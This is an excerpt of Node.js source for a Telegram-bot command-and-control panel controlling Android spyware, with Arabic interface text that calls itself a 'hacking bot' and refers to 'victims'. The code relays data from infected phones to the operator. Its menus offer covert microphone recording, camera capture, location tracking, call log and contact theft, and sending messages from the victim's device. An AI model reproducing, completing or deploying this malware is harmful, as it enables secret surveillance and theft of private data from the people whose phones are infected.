...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : ★𓆩عـ❅ـلاءالحيـ❅ـدري𓆪معرف المطور★ : معرف المطورhttps://t.me/Ala_ALHaidari</h1>')
})
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['★𓆩عـ❅ـلاءالحيـ❅ـدري𓆪معرف المطور★ : معرف المطورhttps://t.me/Ala_ALHaidari'], {parse_mode: "HTML"})
    res.send('')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة ★𓆩عـ❅ـلاءالحيـ❅ـدري𓆪معرف المطور★https://t.me/Ala_ALHaidari ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𓆩❅☣️عددضحايا❅𓆪"], ["𓆩❅قائمة التحكم❅𓆪"]],
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت ★𓆩عـ❅ـلاءالحيـ❅ـدري𓆪معرف المطور★ : معرف المطورhttps://t.me/Ala_ALHaidari\n\n' +
        ...
        if (message.text == '𓆩❅قائمة التحكم❅𓆪') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                ...
                appBot.sendMessage(id, '°• ★حدد الجهاز اللي تريد التحكم به https://t.me/Ala_ALHaidari★', {
                    "reply_markup": {
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• ★حدد اجرا اي شي تريد بجهاز الضحيه  https://t.me/Ala_ALHaidari★
        👇👇 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        ...
                        {text: 'معلومات الهاتفℹ', callback_data: `device_info:${uuid}`}
                    ],
                    [
                    ...
                    [
                        ...
                        {text: 'المكروفون🎤', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'صوره الاماميه📸', callback_data: `camera_main:${uuid}`},
                        {text: 'صوره خلفيه📷', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'الموقع🌏', callback_data: `location:${uuid}`},
                        {text: 'اضهار رساله💢', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'المكالمات📞', callback_data: `calls:${uuid}`},
                        {text: 'جهات الاتصال☎️', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'اهتزاز ⚧', callback_data: `vibrate:${uuid}`},
                        {text: 'اضهار الاشعارات🃏', callback_data: `show_notification:${uuid}`}
                    ],
                    [
